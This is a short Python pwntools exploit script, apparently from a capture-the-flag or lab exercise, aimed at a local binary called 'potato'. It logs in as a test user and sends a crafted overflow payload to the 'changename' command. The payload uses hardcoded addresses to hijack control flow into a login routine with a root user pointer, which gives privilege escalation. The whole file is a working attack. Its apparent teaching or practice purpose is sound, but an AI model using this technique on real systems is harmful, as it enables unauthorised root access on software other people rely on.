#!/usr/bin/env python3

from pwn import *
import sys

elf = ELF("./potato")
p = elf.process(["console"], stdin=PTY, aslr=False) # stdin=PTY for "getpass" password input
gdb.attach(p, '''
break func.c:192
continue
''')

print(p.recvuntil(b"cmd> ")) # username
p.sendline(b"login")
# test user
p.sendline(b"peter")
p.sendline(b"12345")
print(p.recvuntil(b"cmd> ")) # username
# logged in
#p.interactive()
p.sendline(b"changename")

# gotten via p user_list->head->user
root_user=0x8050370
base_ptr=0xffffcdf8
login_setuser=0x0804af24
global_ptr=0x804dff4
restart_handle_client=0x0804965a

payload=b"\x41"*50  + p32(0xffffccf1) + p32(global_ptr) + p32(base_ptr) + p32(login_setuser) + b"\x41"*252 + p32(root_user) + b"\x41"*12 + p32(restart_handle_client)

p.sendline(payload)
p.interactive()
